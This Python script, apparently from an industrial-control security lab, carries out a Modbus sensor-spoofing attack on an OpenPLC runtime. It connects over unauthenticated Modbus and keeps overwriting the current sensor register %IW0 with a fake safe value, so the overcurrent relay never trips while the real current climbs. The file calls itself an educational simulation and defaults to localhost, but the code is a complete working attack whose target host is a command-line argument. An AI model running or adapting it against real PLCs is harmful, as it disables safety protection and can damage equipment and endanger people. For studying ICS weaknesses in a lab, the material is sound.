"""
attack_scripts/atk01_sensor_spoof.py
─────────────────────────────────────────────────────────────
ATK-01: SENSOR SPOOFING

What this simulates:
  An attacker with network access to the OT Modbus segment
  continuously overwrites the current sensor register with a
  low fake value. OpenPLC's ladder logic reads this fake value
  and never triggers the overcurrent protection — even as the
  real current climbs dangerously high.

How it works in a real attack:
  - Attacker gains access to OT network (no auth on Modbus)
  - Identifies sensor register (Modbus FC06 write — no password)
  - Continuously overwrites %IW0 with a safe-looking value
  - PLC protection logic is blinded — thermal damage accumulates

Run this WHILE app.py is running and OpenPLC is connected.
Watch the Flask dashboard: current gauge stays low, but
transformer temperature climbs and alarm fires.

Educational Simulation Only.
"""

import time
import sys
import argparse

try:
    from pymodbus.client import ModbusTcpClient      # pymodbus 3.x
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient # pymodbus 2.x


def run_attack(host="127.0.0.1", port=502, duration=60):
    print("=" * 55)
    print("  ATK-01: SENSOR SPOOFING")
    print("  Target: OpenPLC Runtime")
    print(f"  Host:   {host}:{port}")
    print("  Vector: Modbus FC06 — no authentication required")
    print("  Effect: Overcurrent relay blinded")
    print("  Educational simulation only.")
    print("=" * 55)

    client = ModbusTcpClient(host=host, port=port, timeout=3)
    if not client.connect():
        print(f"\n[!] Cannot connect to OpenPLC at {host}:{port}")
        print("    Is OpenPLC running? Is app.py running?")
        sys.exit(1)

    print(f"\n[+] Connected to OpenPLC at {host}:{port}")
    print(f"[+] Starting sensor spoofing for {duration} seconds...")
    print(f"    Writing fake current value: 18 (= 1.8A)")
    print(f"    Real current in simulation: climbing to ~148A")
    print(f"    Relay threshold:            100A")
    print(f"    Relay will trip:            NEVER (blinded)\n")

    FAKE_CURRENT = 18    # 1.8A — looks safe to PLC
    UNIT_ID      = 1
    REG_CURRENT  = 0     # %IW0

    start = time.time()
    tick  = 0

    try:
        while time.time() - start < duration:
            tick += 1
            elapsed = time.time() - start

            # Write fake current to PLC register %IW0
            result = client.write_registers(
                REG_CURRENT, [FAKE_CURRENT, ], slave=UNIT_ID
            )

            if result.isError():
                print(f"[!] Write failed at tick {tick}: {result}")
            else:
                # Also read back what PLC is outputting (breaker state)
                coils = client.read_coils(0, count=3, slave=UNIT_ID)
                if not coils.isError():
                    breaker = "CLOSED" if coils.bits[0] else "OPEN"
                    alarm   = "ALARM"  if coils.bits[1] else "OK"
                    print(f"[tick {tick:03d}] t={elapsed:5.1f}s | "
                          f"Wrote fake I={FAKE_CURRENT/10:.1f}A to %IW0 | "
                          f"Breaker={breaker} | Alarm={alarm}")

            time.sleep(0.8)   # match simulation tick rate

    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")

    finally:
        client.close()
        print(f"\n[+] Attack complete. Wrote {tick} fake values.")
        print("[+] Check dashboard — transformer temp should be critical.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ATK-01: Sensor Spoofing")
    parser.add_argument("--host",     default="127.0.0.1")
    parser.add_argument("--port",     default=502, type=int)
    parser.add_argument("--duration", default=60,  type=int,
                        help="Attack duration in seconds")
    args = parser.parse_args()
    run_attack(args.host, args.port, args.duration)
